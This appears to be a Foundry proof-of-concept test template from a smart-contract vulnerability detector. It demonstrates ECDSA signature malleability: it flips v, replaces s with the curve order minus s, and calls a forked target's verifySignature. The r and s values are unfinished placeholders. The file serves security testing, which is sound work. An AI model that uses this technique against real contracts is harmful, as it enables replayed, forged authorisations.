// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Signature Malleability (Low-S)
/// @notice Detector: signature-malleability. The target uses ecrecover() but
///         does not enforce a low-S value (EIP-2). An attacker can flip the 
///         v-coordinate/s-value to produce a new, valid signature for the same 
///         message, bypassing signature-based replay protection.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt to target's signature verification.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_exploit() public {
        // TODO: Obtain a valid signature for an operation.
        bytes32 messageHash = keccak256("message");
        uint8 v = 27;
        bytes32 r = 0x123...;
        bytes32 s = 0x456...; // Use high-s value

        // Malleability: Flip v (27 <-> 28) and calculate new s (secp256k1 curve order - s)
        uint8 v2 = v == 27 ? 28 : 27;
        bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));

        bytes memory sig = abi.encodePacked(r, s2, v2);

        // TODO: Adapt to the target's signature verification function
        (bool ok,) = target.call(abi.encodeWithSignature("verifySignature(bytes32,bytes)", messageHash, sig));
        assertTrue(ok, "Signature malleability exploit failed");
        console.log("Malleable signature accepted");
    }
}
